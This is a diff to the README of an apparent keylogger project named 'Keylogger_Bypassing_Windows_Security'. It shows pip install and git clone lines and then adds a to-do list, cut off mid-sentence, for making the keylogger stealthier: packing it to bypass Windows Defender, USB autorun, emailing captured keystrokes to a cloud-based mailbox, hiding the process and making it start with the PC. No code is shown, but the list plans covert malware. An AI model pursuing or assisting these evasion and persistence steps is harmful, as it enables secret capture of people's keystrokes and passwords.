@@ -29,3 +29,16 @@ pip install pynput
 pip install secure-smtplib  
 pip install PyMails  
 git clone https://github.com/ShahMuhammadQureshi/Keylogger_Bypassing_Windows_Security  
+---
+
+
+## Remainings  
+### To-Do List  
+- Make it compatible with Windows.  
+- Ensure the code can access the PowerShell of Windows.  
+- **Obfuscation:** Convert Python script to `.exe`, then use packers to bypass Windows Defender.  
+- Create an autorun script for USB plugins.  
+- Enhance the keylogger's mailing system for long-term implementation on the cloud or conduct research about it.  
+- Hide the `.exe` process.  
+- Ensure the `.exe` file runs automatically every time the PC
+
